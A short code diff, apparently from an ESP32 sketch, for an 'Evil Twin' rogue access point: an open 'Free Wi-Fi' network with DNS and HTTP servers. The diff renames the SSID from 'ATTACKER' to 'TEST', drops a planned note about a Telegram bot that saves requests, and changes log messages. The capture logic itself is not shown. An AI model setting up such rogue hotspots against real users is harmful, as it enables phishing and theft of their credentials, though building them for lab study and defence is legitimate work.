@@ -4,9 +4,7 @@
 
 #include "web_handler.h"
 
-// TBD: add a Telegram Bot that saves requests
-
-const char *ap_ssid = "Free Wi-Fi - ATTACKER";
+const char *ap_ssid = "Free Wi-Fi - TEST";
 const char *ap_password = "";
 
 const byte DNS_PORT = 53;
@@ -22,9 +20,9 @@ void setup() {
     setup_web_handler();    // setup http server
     http_server.begin();        // start http server
 
-    Serial.println("Evil Twin Started");
-    Serial.println("IP Address: ");
-    Serial.println(WiFi.softAPIP());    // print ESP-32 IP Address
+    Serial.println("[OK] Evil Twin Started");
+    Serial.println("[INFO] IP Address: ");
+    Serial.print(WiFi.softAPIP()); 
 
   }
 
